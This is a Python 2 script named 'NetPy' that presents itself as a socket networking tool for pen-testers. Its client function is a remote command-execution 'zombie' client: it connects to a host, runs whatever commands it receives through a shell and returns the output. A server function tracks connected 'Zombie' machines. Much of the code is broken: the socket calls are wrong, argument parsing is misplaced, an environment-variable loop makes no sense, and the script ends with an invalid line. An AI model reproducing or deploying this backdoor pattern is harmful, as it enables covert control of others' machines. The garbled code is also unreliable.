#!/usr/bin/env python

import os
import getopt
import sys
import socket
import subprocess
import time

def client_connect(target, port):
    s = socket.socket()
    s.connect(target, port)
    while True:
        name = s.recv(1024)
        s.send(name, ": 'Zombie here'")
        Cmd = s.recv(1024)
        Output = subprocess.check_output(Cmd, shell=True)
        s.send(Output)
        time.sleep(10)


def usage():
    print "This is a networking tool using the socket module and expanding on it"
    print "Pure Python, NetPy is an open source project for hackers (not black hats) and pen-testers"

    print "To contribute go to https://github.com[account]\n"

    print "Use -h for help, -t to define target and -p to define the port\n"
    print "Examples:\n"

    print "netpy -t [IP] -p 80"
    print "netpy -h"
    print "netpy --target 0.0.0.0 --port 12345"
    
    



def server_setup(port):
    i = 0
    s = socket.socket()
    host = socket.gethostname()
    s.bind((host, port))
    print "Starting Server On Host: ", host,"And Port: %s" %port
    while True:
        conn, addr = s.accept
        print addr, "Connected"
        name = "Zombie", i, addr
        i+=1
        print name
        addr.send(name)
    try:
        opts, args = getopt.getopt(sys.argv[1:],"h:t:p:", ["help","target","port"])
    except getopt.GetoptError as err:
        print str(err)
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = a
        else:
            print "Option Not Supported"
        
keys = os.environ.keys()
from re import search
for key in keys:
   if not search("netpy", key):
      os.environ["netpy"]="C:/python27/PyNet.py"


["netpy"] = "This is a networking tool using the socket module and expanding on it\nPure Python, NetPy is an open source project for hackers (not black hats) and pen-testers\nTo contribute go to https://github.com[account]\n\nUse -h for help, -t to define target and -p to define the port\nExamples:\nnetpy -t [IP] -p 80\nnetpy -hnetpy --target 0.0.0.0 --port 12345"


 

       
